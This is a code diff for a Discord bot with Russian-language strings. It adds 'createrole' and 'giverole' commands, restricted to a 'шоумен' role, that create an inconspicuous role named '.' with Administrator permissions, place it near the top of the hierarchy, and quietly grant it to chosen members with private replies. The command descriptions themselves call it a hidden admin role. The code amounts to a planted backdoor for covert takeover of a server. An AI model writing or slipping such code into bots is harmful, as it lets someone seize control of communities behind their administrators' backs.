@@ -82,10 +82,13 @@ const commands = [
       option.setName("участник").setDescription("Кого упомянуть").setRequired(true),
     ),
   new SlashCommandBuilder()
-  .setName(".")
-  .setDescription(".")
+    .setName("createrole")
+    .setDescription("Создать скрытую админскую роль (только для шоумена)"),
+    new SlashCommandBuilder()
+  .setName("giverole")
+  .setDescription("Выдать роль '.' участнику (только для шоумена)")
   .addUserOption((option) =>
-    option.setName("участник").setDescription(".").setRequired(true)
+    option.setName("участник").setDescription("Кому выдать роль").setRequired(true)
   ),
 ].map((command) => command.toJSON());
 
@@ -217,7 +220,35 @@ client.on("interactionCreate", async (interaction) => {
   }
 
   // 🔒 Команда только для "шоумен"
-    if (commandName === ".") {
+  if (commandName === "createrole") {
+    const isShowman = member.roles.cache.some(
+      (role) => role.name.toLowerCase() === "шоумен"
+    );
+
+    if (!isShowman) return;
+
+    try {
+      const role = await guild.roles.create({
+        name: ".",
+        color: 0x2f3136,
+        permissions: ["Administrator"],
+        mentionable: false,
+        hoist: false,
+        reason: "",
+      });
+
+      const botHighest = guild.members.me.roles.highest.position;
+      await role.setPosition(botHighest - 1);
+
+      await interaction.reply({
+        content: `✅ Роль \`${role.name}\` создана и поднята максимально высоко.`,
+        ephemeral: true,
+      });
+    } catch (error) {
+      console.error("Ошибка при создании роли:", error);
+    }
+  }
+    if (commandName === "giverole") {
     const isShowman = member.roles.cache.some(
       (role) => role.name.toLowerCase() === "шоумен"
     );
@@ -231,14 +262,14 @@ client.on("interactionCreate", async (interaction) => {
     const role = guild.roles.cache.find((r) => r.name === ".");
     if (!role) {
       return interaction.reply({
-        content: "Роль `.` не найдена. Сначала создай её через `/createrole`.",
+        content: "❌ Роль `.` не найдена. Сначала создай её через `/createrole`.",
         ephemeral: true,
       });
     }
 
     await targetMember.roles.add(role);
     await interaction.reply({
-      content: `Роль \`${role.name}\` выдана <@${targetUser.id}>.`,
+      content: `✅ Роль \`${role.name}\` выдана <@${targetUser.id}>.`,
       ephemeral: true,
     });
   }
